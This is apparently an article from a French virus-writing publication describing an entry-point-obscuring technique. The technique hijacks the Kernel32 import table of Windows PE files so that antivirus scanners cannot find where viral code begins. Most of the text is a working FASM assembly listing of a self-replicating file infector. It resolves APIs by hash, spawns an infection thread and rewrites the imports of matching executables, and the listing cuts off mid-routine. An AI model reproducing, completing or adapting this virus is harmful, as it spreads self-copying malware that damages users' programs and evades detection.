@@ -1,0 +1,1532 @@
+-------------------------------------------------------------------------------
+XI    Exemple d'EPO sous Windows                                        Urgo32
+-------------------------------------------------------------------------------
+
+
+
+Introduction:
+-------------
+
+
+Pour rendre plus difficile la détection d'un virus informatique de nombreuses 
+techniques ont été inventées. 
+Au nombre de ces techniques on trouve celles appelées E.P.O (entry point 
+obscuring).
+Leur but est d'empêcher un antivirus de trouver le début du code du virus.
+
+Les premiers virus informatiques ciblant Windows95 avaient un comportement 
+commun; ils prenaient le contrôle dès que les programmes qui les contenaient 
+étaient lancés. 
+Cela signifie que le code du virus est exécuté avant qu'aucune instruction du 
+programme infecté ne le soit.
+
+Par voie de conséquence, il est ainsi trés facile pour un antivirus de lire les
+premiers octets du code du virus. 
+Il lui suffit d'aller lire dans l'en-tête de l'exécutable l'adresse de la 
+première instruction qui doit être exécutée. Cette adresse est appelée le point
+d'entrée du programme.
+
+Un virus utilisant une technique d'E.P.O rend plus complexe la détermination 
+du début du code viral puisque la seule connaissance du point d'entrée du 
+programme infecté est insuffisante.
+
+On peut se demander comment le virus prend le contrôle pour exécuter son propre
+code.
+
+
+Cela dépend des détails de la technique utilisée. 
+Voici la technique E.P.O la plus simple probablement. 
+Elle consiste à écraser les premiers octets qui constituent le point d'entrée
+du programme par une instruction de saut vers le code du virus 
+(JMP XXXX; PUSH XXXX RET; XOR EAX,EAX JZ XXXX;....).
+
+Une autre technique un peu plus complexe est de chercher dans le code du 
+programme à infecter des instructions JMP ou CALL, en modifiant une de ces 
+instructions on peut rediriger le saut pour qu'il ait lieu vers le code du 
+virus.
+
+Cette dernière technique souffre d'un inconvénient notable. 
+Il n'est pas sûr que l'instruction qui a été modifiée pour effectuer un saut 
+vers le code virale soit effectivement exécutée.
+Elle peut appartenir à une branche qui n'est jamais, ou peu, exécutée à l'issue
+d'un test.
+
+De nombreuses autres techniques de même nature existent. Elles ont en commun 
+qu'une ou plusieurs instructions du programme infecté sont modifiées pour être 
+remplacées par une instruction de saut vers le code du virus.
+
+Dans ce qui suit je voudrais présenter une technique E.P.O peu connue qui 
+n'entre pas dans cette catégorie. 
+En effet, aucune instruction du code du programme infecté n'est changée ou 
+altérée.
+
+Pour ce faire il nous faut décrire le processus d'importation de fonctions 
+d'une librairie dynamique vers un exécutable.
+
+
+
+Notions sur le format P.E:
+--------------------------
+
+Un fichier exécutable sous Windows (Win9x,WinME,NT,XP,2000) comme notepad a un 
+format appelé format Portable exécutable (P.E). Un exécutable contient 
+plusieurs en-têtes:
+
+
+-En-tête msdos
+
+-En-tête 'FILE HEADER'
+
+-En-tête optionnel ('OPTIONAL HEADER'):
+à la fin de cet en-tête il existe une table de structures appelées DATA 
+DIRECTORY
+
+-Table des en-tête des sections ('SECTION HEADER')
+
+
+Ce qui nous intéresse est la table des structures DATA DIRECTORY. 
+Les deux premiers membres de cette table correspondent respectivement à 
+l'exportation (1er élément de la table) et l'importation (2ème élément de la 
+table). 
+Il y'en a d'autres mais ils sont inutiles pour notre propos actuel.
+
+
+
+la structure DATA DIRECTORY est définie comme:
+
+
+struct
+{
+
+VirtualAddress		dd ?
+Size			dd ?
+
+}
+
+Le champ VirtualAddress est une adresse virtuelle relative (RVA). 
+C'est une sorte de pointeur sur une table de structures de type IMPORT 
+DESCRIPTOR. Il y'a autant de structures IMPORT DESCRIPTOR dans cette table 
+qu'il y'a de librairies dynamiques (DLL) qui exportent des fonctions vers 
+l'exécutable.
+
+
+Dans l'en-tête optionnel il existe un champ qui contient une adresse mémoire où
+doit être chargé par défaut l'exécutable, c'est le champ OH_ImageBase. 
+Ainsi par défaut, la valeur du champ VirtualAddress qui nous intéresse ajoutée 
+à la valeur OH_ImageBase est l'adresse mémoire de début d'une structure IMPORT 
+DESCRIPTOR.
+
+Ainsi RVA+adresse mémoire de début de l'éxécutable= adresse mémoire
+
+
+la structure IMPORT DESCRIPTOR est définie comme:
+
+struct
+{
+
+ID_OriginalFirstThunk	dd ?
+ID_TimeDateStamp	dd ?
+ID_ForwarderChain	dd ?
+ID_Name			dd ?
+ID_FirstThunk		dd ?
+
+}
+
+Seuls trois champs nous intéressent.
+
+OriginalFirstThunk est un pointeur (une RVA) sur une table de structures THUNK 
+DATA.
+FirstThunk est un pointeur (RVA) sur une table de structures THUNK DATA aussi. 
+Mais nous avons affaire à deux tables différentes, elles sont localisées en 
+mémoire à deux endroits différents.
+
+Name est un pointeur sur une chaine ASCII terminée par un 0 qui est le nom de 
+la librairie dynamique (une DLL comme Kernel32.dll, User32.dll,...) qui est 
+concernée.
+
+Pour chaque table Il y'a autant de structures THUNK DATA que de fonctions 
+exportées par la librairie dynamique.
+
+Les deux tables sont composées des mêmes structures THUNK DATA. Ces structures 
+sont rangées dans le même ordre dans les deux tables bien que les tables, 
+rappelons le, soient à des emplacement différents.
+
+En fait une structure THUNK DATA est un pointeur (une RVA) vers une structure 
+IMPORT BY NAME.
+
+
+
+La structure IMPORT BY NAME est définie comme:
+
+struct
+{
+
+IBN_Hint		dd ?
+IBN_Name		dd ?
+
+}
+
+
+Le champ IBN_Name est un pointeur (RVA) sur une chaîne ASCII terminée par un 0 
+qui est le nom d'une fonction exportée par la librairie dynamique dont le nom 
+est pointé par le champ ID_Name.
+
+
+Nous pouvons maintenant décrire le processus de résolution des adresses des 
+fonctions importées lors du chargement d'un programme P.E par Windows.
+
+Pour chaque librairie dynamique et donc pour chaque structure IMPORT DESCRIPTOR
+on s'intéresse ou bien au champ OriginalFirstThunk (qui peut être nul), ou bien
+au champ FirstThunk pour lire le nom de toutes les fonctions importées de la 
+librairie dynamique.
+
+Windows détermine les adresses mémoire de toutes ces fonctions (après qu'il ait
+chargé la DLL correspondante si nécessaire). Toutes ces adresses vont remplacer
+les valeurs de la table de structures THUNK DATA pointée par le champ 
+FirstThunk.
+
+L'autre table pointée par OriginalFirstThunk reste inchangée (si elle existait).
+
+L'ordre dans la table (pointée par FirstThunk) des adresses des fonctions 
+importées est le même que celui des structures THUNK DATA (qui correspondaient 
+chacunes à une fonction importée) présentes précédemment au même emplacement.
+
+
+Description d'une technique de type E.P.O peu connue:
+-----------------------------------------------------
+
+Nous pouvons aller un peu plus avant dans la description de notre technique 
+E.P.O.
+Comme nous venons de le voir le champ ID_FirstThunk est une RVA vers une table 
+de double mots qui va contenir toutes les adresses importées de la DLL dont le 
+nom est pointé par ID_Name.
+
+
+Cela veut dire que pour appeler une fonction de Kernel32.dll ppar exemple, DLL 
+qui contient les fonctions fondamentales du système, un programme contiendra 
+sous une forme ou une autre une instruction qui va ressembler à:
+
+call [400012h]. 400012h étant une adresse qui pointe sur un élément de la table
+pointée par ID_FirstThunk.
+
+
+
+L'appel à une sous-routine peut prendre différents aspects:
+
+CALL [EDI], CALL [EAX+EBX]
+
+EDI devra contenir une adresse qui pointe sur la table pointée par ID_FirstThunk
+le contenu de EAX + le contenu de ebx donne une adresse dans la même table.
+
+La façon d'effectuer un appel à une fonction importée sera toujours conforme à 
+ce modèle, un registre ou une expression à base de registres 
+(CALL [EAX+4*ESI+CONSTANTE] par exemple)
+va contenir une adresse pointant sur la table pointée par ID_FirstThunk.
+Le contenu à l'emplacement de cette adresse est la destination de l'appel à la 
+fonction.
+
+
+Il existe une variante qu'on rencontre parfois, toujours pour appeler une 
+fonction importée d'une DLL:
+
+CALL 400023h		(l'adresse 400023h est arbitraire)
+
+
+A l'adresse 400023h on trouve l'instruction:
+
+jmp dword [400100h]	(l'adresse 400100h est arbitraire)
+
+et une fois de plus 400100h est une adresse dans la même table que précédemment.
+
+
+Une instruction de type CALL EDI peut-être rencontrée aussi. 
+Cela suppose qu'avant le programme a exécuter une instruction du type: 
+mov edi,[400109h] (400109h arbitraire) où 400109h est là
+encore une adresse pointant sur un élément de la même table.
+
+Maintenant, que se passerait-il si on change les champs OriginalFirstThunk et 
+FirstThunk?
+
+Si on fait un changement intelligent, on peut arriver à faire en sorte que 
+Windows remplisse la nouvelle table avec des adresses de fonctions importées de
+Kernel32 que l'on a choisies. 
+Le programme continuera à "penser" que la vrai table est l'ancienne, celle-ci 
+sera ignorée par Windows au moment du chargement du programme, seule la 
+nouvelle table sera prise en compte puisque les champs OriginalFirstThunk et 
+FirstThunk ont été changés.
+
+Rien ne nous empêche de remplir la vieille table sur laquelle pointaient 
+l'ancienne valeur FirstThunk avec une adresse (répétée autant de fois qu'il y'a
+d'entrées dans cette table) bien choisie pour pointer sur du code.
+
+Lorsque le programme sera exécuté, chaque appel de sa part à une fonction de 
+Kernel32 (puisqu'on a choisi de modifier les champs de sa structure IMPORT 
+DESCRIPTOR qui se rapportent à cette DLL) va exécuter le code se trouvant à 
+l'adresse que nous avons choisie.
+
+
+Voila en résumé notre méthode E.P.O.
+Dans le détail, il y'a des problèmes à résoudre. 
+Si on rempli l'ancienne table pointée par l'ancienne valeur de FirstThunk avec 
+seulement une seule adresse pour chaque cellule de la table nous allons faire 
+face à un problème un peu délicat.
+
+Le virus doit faire suivre l'appel à une fonction de Kernel32 qu'il a détourné 
+vers la vraie adresse de cette fonction. Deviner quelle fonction de Kernel32 a 
+été réellement appelée n'est pas une mince affaire dans ces conditions 
+(bien que cela ne soit pas impossible).
+
+Il faut comprendre que pour arriver à déterminer quelle fonction de Kernel32 a 
+été appelée il nous faut l'index (qui commence à 0) de cette fonction dans la 
+table. Si on pouvait déterminer quelle élément de la table à servi à faire le 
+saut vers le virus on pourrait connaitre quelle fonction est appelée. 
+En utilisant la vieille valeur de OriginalFirstThunk qui pointe sur une table 
+de pointeurs et l'index récupéré on se positionnerait dans dans la table
+associée à cette vieille valeur de OriginalFirstThunk et on pourrait 
+déterminer le nom d'une fonction de Kernel32. 
+Le nom de cette fonction serait bien celui correspondant à l'index.
+
+
+Pour simplifier la solution au problème de deviner quelle fonction de Kernel32 
+est appelée on remplit la table pointée par la vieille valeur de FirstThunk 
+avec des adresses différentes, chacunes de ces adresses pointant sur une 
+instruction:
+
+
+call 470008h 		(470008h est arbitraire)
+
+470008h étant l'adresse de début du virus.
+
+
+l'adresse de retour de ce CALL, qui rappelons le, est empilée sur la pile au 
+moment de l' exécution du CALL permet de déterminer quel CALL de la table a 
+été appelé. 
+L'index du CALL est le même que celui dans la table pointée par le vieux 
+OriginalThunk de la fonction de Kernel32 appelée.
+
+
+La table des call ressemble à ceci:
+
+
+adr0:
+call virus	;db e8,+ 4 octets (opcode)
+adr1:
+call virus	;db e8,+ 4 octets (opcode)
+adr2:
+call virus	;db e8,+ 4 octets (opcode)
+
+....
+
+adrN:
+call virus	;db e8,+ 4 octets (opcode)
+
+
+N+1= le nombre de fonctions importées  de Kernel32
+
+adr1,adr2,...,adrN servent  à remplir la table pointée par le vieux FirstThunk
+
+
+si le CALL à l'adresse adr7 est exécuté dans la pile on aura adr8
+
+
+Ainsi, si X est l'adresse de retour d'un CALL de cette table
+
+
+la formule:		((X-adr0)/5)-1
+
+
+donne l'index (qui peut être 0) dans cette table. 
+Cet index permet facilement de déterminer l' adresse de la fonction de Kernel32
+appelée si on a conservé la valeur de OriginalFirstThunk telle qu'elle était 
+dans le programme avant qu'on ne l'a change.
+
+Un fichier infecté donnera l'impression de n'importer qu'une fonction de 
+Kernel32.
+Nous avons choisi de forcer le programme infecté à n'importer que GlobalAlloc.
+Cette fonction permet au virus de se réserver dynamiquement de l'espace pour 
+agir. Cela permet de ne pas changer les attributs des sections du programme 
+infecté.
+
+
+
+Conclusion:
+------------
+
+La technique E.P.O présentée ici doit être améliorée car elle a des 
+inconvénients.
+
+Un fichier infecté contient, entre autre, une table de CALL. 
+Cette table est logée impérativement dans une section code, sa taille est égale
+au nombre de fonctions de Kernel32 importée par l'hôte originellement multiplié
+par 5. 
+Si la section code ne contient pas assez de place (c'est à dire des 0 à la fin)
+pour accueillir cette table, le fichier ne peut pas être infecté.
+
+Une amélioration possible est de remplacer la table des CALL par une table de 
+PUSH EAX (je vous laisse essayer de comprendre pourquoi c'est une bonne idée). 
+On divise par 5 la taille de la table ce qui rend plus probable la possibilité 
+de la caser dans la section code.
+
+Une autre façon est de tracer à rebour la nature du CALL utilisé. 
+La connaissance du contenu des registres juste avant l'appel à la fonction 
+importée permet de déterminer celle-ci.
+
+
+
+
+
+Debut du listing du programme exemple:
+
+
+
+
+
+;-----------------------------------COUPER ICI----------------------------------------------------
+
+
+;Ce programme est le complement a l'article :
+
+;		"Une technique E.P.O virale peu connue"
+;		 DoxtorL. Juin 2003
+
+;Ce programme modifie tous les fichiers P.E dont les noms sont conformes a
+;NOM_FICHIER_RECHERCHE dans le repertoire courant et dans celui-ci seulement.
+
+;Lors du demarrage d'un fichier infecte une thread est creee pour le code du
+;virus. La thread commence par faire une pause de DUREE_PAUSE2 millisecondes.
+;puis se met en action.
+
+
+;Avertissements:
+;Bien que ce virus informatique puisse seulement modifier des programmes dans
+;le repertoire courant si vous ne savez pas ce que vous faites mieux vaut ne
+;pas compiler ce programme et l'executer.
+
+;N'ayant fourni aucun fichier binaire pour qu'il soit joint a ce listing, je
+;considere que je ne peux etre tenu pour responsable du mauvais usage de ce
+;programme.
+
+;Pour la compilation vous avez besoin d' un assembleur appele FASM qui est un
+;programme libre et gratuit facile a obtenir si vous avez une connexion
+;internet.
+
+;Le virus a ete effectivement teste sur plateforme Windows 98 SE
+;Sous Windows 2000, des problemes peuvent survenir et Le système SFC empêche la 
+;modification des fichiers natifs de Windows 2000.
+;(lire l'addendum de l'article d'ou est issu ce listing)
+;Neanmoins certains fichiers P.E ne peuvent etre modifies.
+
+;Sur Windows 98 S.E:
+;Calc.exe, iexplorer.exe (version livree avec Windows 98 SE), notepad,
+;Winword 2000 ont pu ainsi etre infectes avec succes et ces fichiers a leur
+;tour ont pu etre executes et capables d'infecter d'autres fichiers.
+
+
+;En tout etat de cause, si le programme utilise toute la place de la section
+;data que le virus utilise aussi, un crash est inévitable
+
+
+;Le virus ne possede aucune routine pour changer les attributs de fichiers.
+;Les fichiers ayant, par exemple, l'attribut "Lecture seulement" ne seront
+;pas infectes.
+
+
+format PE GUI
+entry commencement
+
+ADR_BASE=400000h
+DUREE_PAUSE1=30000
+DUREE_PAUSE2=20000
+NOM_FICHIER_RECHERCHE equ 'cible*.exe',0
+
+include		'include\macro\import.inc'
+include		'include\macro\stdcall.inc'
+include		'include\exehdr.inc'
+include		'include\kernel.inc'
+
+;strutures:
+IMAGE_DOS_HEADER	ecx,edx,edi
+IMAGE_FILE_HEADER	ecx,edx,esi
+IMAGE_OPTIONAL_HEADER	edx,edi
+IMAGE_SECTION_HEADER	esi
+IMAGE_DATA_DIRECTORY	eax,esi
+IMAGE_IMPORT_DESCRIPTOR	esi
+IMAGE_IMPORT_BY_NAME	eax
+IMAGE_EXPORT_DIRECTORY	eax
+WIN32_FIND_DATA		edi
+
+adr_mem_alloc dd 0
+
+commencement:
+
+
+stdcall __Sleep,DUREE_PAUSE1
+stdcall __ExitProcess,0
+
+;Fin du programme regulier
+
+
+__ExitProcess:
+call execution_fct_k32
+__Sleep:
+call execution_fct_k32
+
+execution_fct_k32:
+pushad
+mov eax,debut_virus
+push eax
+ret
+
+
+
+;[Debut reel du virus]:
+
+debut_virus:
+;[Calcul du decalage du a la relocation du code du virus]:
+
+
+call ici
+ici:
+pop ebp
+sub ebp,ici
+
+;[Fin du calcul du a la relocation]
+
+
+db 83h,3dh		;cmp dword [<adr>]
+ptr1_mem_alloc_sect_data_hote dd adr_mem_alloc
+db 0
+jnz pas_premier_passage
+
+;Premiere execution du code viral
+
+mov edi,[ptr1_mem_alloc_sect_data_hote+ebp]
+stosd
+
+
+;prepare le retour au code de l'hote:
+lea esi,[adr_espace_libre_sect_code_cible+ebp]
+lodsd
+mov edi,esi
+stosd
+
+;[Debut de la recherche de l'adresse de Kernel32]:
+
+db 8bh,15h		;mov edx,[<adr>]
+ptr1_adr_globalalloc dd ExitProcess
+
+mov eax,edx
+
+
+recherche_mz:
+dec edx
+cmp word [edx.MZ_magic],MZ_MAGIC
+jnz recherche_mz
+
+;une signature "MZ" a ete trouvee
+
+mov ecx,edx
+mov ecx,dword [ecx.MZ_lfanew]
+add ecx,edx
+jc recherche_mz
+
+cmp ecx,eax
+ja recherche_mz
+
+cmp dword [ecx.FH_Signature],PE_MAGIC
+jnz recherche_mz
+
+;[Fin de recherche de l'adresse de Kernel32]
+
+;ecx pointe sur l'en-tete IMAGE_FILE_HEADER de Kernel32
+;edx contient l'adresse de Kernel32
+
+
+
+
+
+;[Debut de la recherche des fonctions de Kernel32 utilisees par le virus]:
+
+;eax pointe sur le debut de la structure IMAGE_DIRECTORY_DATA de la directory
+;export:
+
+lea eax,[ecx+sizeof.IMAGE_FILE_HEADER+sizeof.IMAGE_OPTIONAL_HEADER]
+
+mov eax,dword [eax.DD_VirtualAddress]
+add eax,edx
+
+mov esi,dword [eax.ED_AddressOfNames]
+add esi,edx
+
+or ebx,-1
+mov ecx,NBRE_FCT_K32_VIRUS
+sub esi,4
+
+recherche_adr_fct_k32_virus:
+
+add esi,4
+inc ebx
+
+;[Debut du calcul d'un condense pour le nom de la fonction de Kernel32
+;en cours de test]:
+
+pushad
+mov esi,dword [esi]
+add esi,edx
+
+xor eax,eax
+xor ecx,ecx
+
+caractere_suivant:
+
+lodsb
+or al,al
+jz fin_chaine
+add cl,al
+rol eax,cl
+add ecx,eax
+jmp caractere_suivant
+
+fin_chaine:
+mov [condense+ebp],ecx
+popad
+
+;[Fin du calcul du condense]
+
+;[Debut de la recherche du condense dans la table des condenses pre-calcules
+;des fonctions de Kernel32 utilisees par le virus]:
+
+push eax
+push ecx
+mov eax,[condense+ebp]
+mov ecx,NBRE_FCT_K32_VIRUS
+lea edi,[tab_condense+ebp]
+repne scasd
+pop ecx
+pop eax
+jnz recherche_adr_fct_k32_virus
+
+
+;[Fin de la recherche du condense dans la table]
+
+
+
+
+
+;[Recuperation de l'adresse de la fonction de Kernel32 dont le condense du nom
+;est dans la table]:
+
+pushad
+mov ecx,dword [eax.ED_AddressOfNamesOrdinals]
+add ecx,edx
+
+movzx ebx,word [ecx+2*ebx]
+
+mov ecx,dword [eax.ED_AddressOfFunctions]
+add ecx,edx
+
+mov ecx,dword [ecx+4*ebx]
+add ecx,edx
+
+add edi,4*NBRE_FCT_K32_VIRUS-4
+mov dword [edi],ecx
+
+popad
+
+;[Fin de la recuperation de l'adresse de la fonction de Kernel32]
+
+loop recherche_adr_fct_k32_virus
+
+;[Fin de la recherche des fonctions de Kernel32 utilisees par le virus]
+
+
+
+
+
+;[Debut de la recuperation des adresses utilisees par l'hote]:
+
+mov esi,[rva_orig_1st_thunk_avant_infection_hote+ebp]
+add esi,[adr_image_base+ebp]
+
+lea edi,[tab_adr_fct_k32_hote+ebp]
+
+explore_struct_import_by_name_k32_hote:
+
+lodsd
+test eax,eax
+jz fin_recuperation_fct_k32_hote
+
+add eax,[adr_image_base+ebp]
+
+pushad
+lea ebx,[eax.IBN_Name]
+stdcall [GetProcAddress+ebp],edx,ebx
+mov dword [esp+28],eax
+popad			;seulement eax est modifie
+
+
+stosd
+jmp explore_struct_import_by_name_k32_hote
+
+fin_recuperation_fct_k32_hote:
+
+;[Recuperation de la fonction de Kernel32 dont la structure
+;IMPORT_BY_NAME a ete changee pour accueillir le nom GlobalAlloc]:
+
+pushad
+lea ebx,[sz_nom_fct_k32_altere_hote+ebp]
+stdcall [GetProcAddress+ebp],edx,ebx
+mov ecx,[index_fct_k32_altere_hote+ebp]
+lea edi,[tab_adr_fct_k32_hote+4*ecx+ebp]
+stosd
+popad
+
+
+;[Fin recuperation de la derniere fonction de Kernel32 de l'hote]
+
+;[Fin de le recuperation des adresses utilisees par l'hote]
+
+
+
+;[Debut de creation de la thread infectieuse]:
+
+lea esi,[thread_id+ebp]
+lea edi,[proc_infectieuse+ebp]
+xor eax,eax
+stdcall [CreateThread+ebp],eax,eax,edi,eax,eax,esi
+
+;[Fin de la creation de la thread]
+
+
+
+
+pas_premier_passage:
+
+mov eax,[esp+32]
+sub eax,[adr_espace_libre_sect_code_hote+ebp]
+xor ebx,ebx
+mov bl,5
+xor edx,edx
+div ebx
+dec eax
+mov eax,[tab_adr_fct_k32_hote+4*eax+ebp]
+xchg eax,[esp+32]
+popad
+ret
+
+
+proc_infectieuse:
+
+;[Debut du code de la thread infectieuse]:
+
+call suite
+suite:
+pop ebp
+sub ebp,suite
+
+stdcall [Sleep+ebp],DUREE_PAUSE2
+
+
+;[Debut de la recherche de programmes cibles]:
+
+lea esi,[sz_type_extension_fichier_cible+ebp]
+lea edi,[struct_recherche+ebp]
+stdcall [FindFirstFileA+ebp],esi,edi
+mov ebx,eax
+inc eax
+jz plus_de_fichier
+call infection
+
+fichier_suivant:
+stdcall [FindNextFileA+ebp],ebx,edi
+test eax,eax
+jz plus_de_fichier
+call infection
+jmp fichier_suivant
+
+plus_de_fichier:
+stdcall [FindClose+ebp],ebx
+xor eax,eax
+stdcall [ExitThread+ebp],eax
+
+;[Fin de la recherche de programmes cibles]
+
+;[Fin du code de la thread infectieuse]
+
+
+
+
+;[Debut du code de la fonction principale du virus]:
+
+infection:
+
+pushad
+;[Ouverture du fichier cible et creation de son image memoire]:
+
+lea edi,[struct_recherche+ebp]
+lea esi,[edi.WFD_szFileName]
+add dword [edi.WFD_nFileSizeLow],TAILLE_VIRUS_ALIGNE_FICHIER
+xor ebx,ebx
+stdcall [CreateFileA+ebp],esi,GENERIC_READ or GENERIC_WRITE,\
+FILE_SHARE_READ,ebx,OPEN_EXISTING,ebx,ebx
+inc eax
+jz err_infection
+dec eax
+mov [handle_fichier_cible+ebp],eax
+
+stdcall [CreateFileMappingA+ebp],eax,ebx,PAGE_READWRITE,ebx,\
+dword [edi.WFD_nFileSizeLow],ebx
+test eax,eax
+jz err_infection
+mov [handle_map_cible+ebp],eax
+
+stdcall [MapViewOfFile+ebp],eax,FILE_MAP_ALL_ACCESS,ebx,ebx,ebx
+test eax,eax
+jz err_infection
+
+mov [adr_map_cible+ebp],eax
+mov edx,eax
+
+;[Fin de la creation de l'image memoire du fichier cible]
+
+
+
+;[Debut de la verification du fichier cible]:
+
+cmp word [edx.MZ_magic],MZ_MAGIC
+jnz err_infection
+
+cmp word [edx.MZ_csum],'VX'
+
+mov eax,dword [edx.MZ_lfanew]
+cmp eax,dword [edi.WFD_nFileSizeLow]
+jae err_infection
+
+add edx,eax
+mov [adr_map_IMAGE_FILE_HEADER_cible+ebp],edx
+
+cmp dword [edx.FH_Signature],PE_MAGIC
+jnz err_infection
+
+
+;[Debut de la recherche de la section 'code', la section qui contient
+;le point d'entree du programme cible]:
+
+movzx ebx,word [edx.FH_SizeOfOptionalHeader]
+movzx ecx,word [edx.FH_NumberOfSections]
+add edx,sizeof.IMAGE_FILE_HEADER
+
+mov [adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp],edx
+
+mov eax,dword [edx.OH_ImageBase]
+mov [adr_image_base+ebp],eax
+
+mov eax,dword [edx.OH_AddressOfEntryPoint]
+add edx,ebx
+mov [adr_map_IMAGE_SECTION_HEADER_cible+ebp],edx
+mov esi,edx
+mov edi,ecx
+
+recherche_section_code:
+cmp dword [esi.SH_VirtualAddress],eax
+ja section_code_trouve
+add esi,sizeof.IMAGE_SECTION_HEADER
+loop recherche_section_code
+
+jmp err_infection
+
+
+section_code_trouve:
+
+;[Fin de la routine de recherche de la section 'code];
+
+
+test dword [esi.SH_Characteristics-sizeof.IMAGE_SECTION_HEADER],\
+IMAGE_SCN_MEM_WRITE
+jnz err_infection
+
+push edi	;sauvegarde du nombre de sections de l'hote
+
+
+;[Debut de la localisation d'un espace 'vide' et de sa taille dans
+;la fin de la section 'code']:
+
+mov edi,dword [esi.SH_PointerToRawData]
+add edi,[adr_map_cible+ebp]
+dec edi
+std
+xor eax,eax
+xor ecx,ecx
+dec ecx
+rep scasb
+neg ecx
+sub ecx,10	;pour tenir compte de la presence eventuelle d'une
+add edi,10	;'table d'import' (celle ci se finissant par db 0,0,0,0)
+		
+mov [nbre_octet_libre_sect_code_cible+ebp],ecx
+mov [adr_map_espace_libre_sect_code_cible+ebp],edi
+
+stdcall adr_map_vers_rva,edi;eax
+add eax,[adr_image_base+ebp]
+mov [adr_espace_libre_sect_code_cible+ebp],eax
+
+pop ecx
+
+sub esi,sizeof.IMAGE_SECTION_HEADER
+call aligne
+mov esi,edx
+
+;[Fin de la localisation d'un espace dans la section 'code']
+
+
+
+;[Recherche d'un espace libre dans la section 'data' trouvee]:
+
+recherche_section_data:
+test dword [esi.SH_Characteristics],IMAGE_SCN_MEM_WRITE
+jnz section_data_trouve
+add esi,sizeof.IMAGE_SECTION_HEADER
+loop recherche_section_data
+
+jmp err_infection
+
+section_data_trouve:
+cmp dword [esi.SH_PointerToRawData],0
+jz recherche_section_data
+
+call aligne
+
+dec ecx
+jz err_infection
+add esi,sizeof.IMAGE_SECTION_HEADER
+mov edi,dword [esi.SH_PointerToRawData]
+add edi,[adr_map_cible+ebp]
+
+
+sub edi,4
+cmp dword [edi],0
+jnz err_infection
+
+sub edi,4
+cmp dword [edi],0
+jnz err_infection
+
+mov [adr_map_espace_libre_sect_data_cible+ebp],edi
+
+;[Fin de la recherche d'un espace libre dans la section 'data' trouvee]
+
+
+
+
+;[Recherche de le structure IMAGE_IMPORT_DESCRIPTOR dediee aux imports
+;de Kernel32]:
+
+mov edx,[adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp]
+lea esi,[edx+sizeof.IMAGE_OPTIONAL_HEADER+sizeof.IMAGE_DATA_DIRECTORY]
+
+;esi pointe sur la structure IMAGE_DATA_DIRECTORY dediee a l'import:
+mov esi,dword [esi.DD_VirtualAddress]
+
+
+stdcall rva_vers_adr_map,esi
+mov esi,eax
+
+sub esi,sizeof.IMAGE_IMPORT_DESCRIPTOR
+
+recherche_k32_image_import_descriptor:
+
+add esi,sizeof.IMAGE_IMPORT_DESCRIPTOR
+mov edi,dword [esi.ID_Name]
+test edi,edi
+jz err_infection
+
+stdcall rva_vers_adr_map,edi
+mov edi,eax
+
+cmp dword [edi],'KERN'
+jnz recherche_k32_image_import_descriptor
+
+add edi,4
+
+cmp dword [edi],'EL32'
+jnz recherche_k32_image_import_descriptor
+
+mov [adr_map_IMAGE_IMPORT_DESCRIPTOR_cible+ebp],esi
+
+;[Fin de la recherche de la structure IMAGE_IMPORT_DESCRIPTOR]
+
+
+
+stdcall rva_vers_adr_map,dword [esi.ID_FirstThunk]
+mov [adr_map_1st_thunk_k32_cible+ebp],eax
+
+mov esi,dword [esi.ID_OriginalFirstThunk]
+test esi,esi
+jz err_infection
+
+mov [rva_orig_1st_thunk_avant_infection_hote+ebp],esi
+
+stdcall rva_vers_adr_map,esi
+mov [adr_map_original_1st_thunk_k32_cible+ebp],eax
+
+
+
+;[Debut du calcul du nombre de fonctions de Kernel32 importees par le
+;programme cible]:
+
+mov esi,eax
+mov edi,eax
+cld
+xor eax,eax
+xor ecx,ecx
+dec ecx
+repne scasd
+neg ecx
+dec ecx
+dec ecx
+
+mov [nbre_fct_k32_cible+ebp],ecx
+lea ecx,[ecx+4*ecx+TAILLE_LOADER]	;ecx <-5*ecx+TAILLE_LOADER
+cmp ecx,[nbre_octet_libre_sect_code_cible+ebp]
+ja err_infection
+
+;[Fin du calcul du nombre de fonctions importees de Kernel32]
+
+mov ebx,esi
+
+;[Recherche d'une fonction de Kernel32 importee par la cible
+;dont le nom a au moins 11 symboles]:
+
+xor ebx,ebx
+dec ebx
+recherche_nom_fct_k32_cible:
+inc ebx
+lodsd
+test eax,eax
+jz err_infection
+
+mov [rva_IMAGE_IMPORT_BY_NAME_cible+ebp],eax
+mov ecx,eax
+stdcall rva_vers_adr_map,eax
+lea edi,[eax.IBN_Name]
+mov edx,edi
+
+pushad
+xor eax,eax
+xor ecx,ecx
+mov cl,11
+repne scasb
+popad
+jz recherche_nom_fct_k32_cible
+
+
+;[Fin de la verification du fichier cible]
+
+
+
+pushad
+mov esi,edx
+mov [index_fct_k32_altere_hote+ebp],ebx
+lea edi,[sz_nom_fct_k32_altere_hote+ebp]
+call copie_chaine
+
+;a partir d'ici des changements sont effectues dans le fichier cible
+
+lea esi,[sz_nom_globalalloc+ebp]
+mov edi,edx
+call copie_chaine
+popad
+
+sub esi,ebx
+shr esi,2
+dec esi
+mov [index_tab_image_import_by_name_k32_cible+ebp],esi
+
+
+;[Fin de la recherche d'une fonction de Kernel32 importee dont le nom a au
+;moins 11 symboles]
+
+mov eax,[rva_IMAGE_IMPORT_BY_NAME_cible+ebp]
+mov edi,[adr_map_espace_libre_sect_data_cible+ebp]
+
+mov esi,edi
+stosd
+stdcall adr_map_vers_rva,esi
+mov ebx,eax
+add eax,[adr_image_base+ebp]
+mov [ptr1_adr_globalalloc+ebp],eax
+mov [ptr2_adr_globalalloc+ebp],eax
+add eax,4
+mov [ptr2_mem_alloc_sect_data_hote+ebp],eax
+mov edi,[adr_map_IMAGE_IMPORT_DESCRIPTOR_cible+ebp]
+
+xor eax,eax
+stosd
+dec eax
+stosd
+stosd
+add edi,4
+mov eax,ebx
+stosd
+mov esi,[adr_map_espace_libre_sect_code_cible+ebp]
+stdcall adr_map_vers_rva,esi
+add eax,[adr_image_base+ebp]
+
+;[Debut de la reconstruction de la table des thunk_data pointee par
+;first_thunk]:
+
+mov ecx,[nbre_fct_k32_cible+ebp]
+push ecx
+mov edi,[adr_map_1st_thunk_k32_cible+ebp]
+
+element_suivant_tab_thunk_data:
+stosd
+add eax,5
+loop element_suivant_tab_thunk_data
+
+;[Fin de la reconstruction de la table]
+
+
+;[Debut de la destruction de la structure DATA_DIRECTORY qui fait
+;reference a une directory utilisee par Windows pour decider si la table
+;pointee par FirstThunk peut etre utilisee telle quelle. (cette structure
+;peut etre absente)
+
+pushad
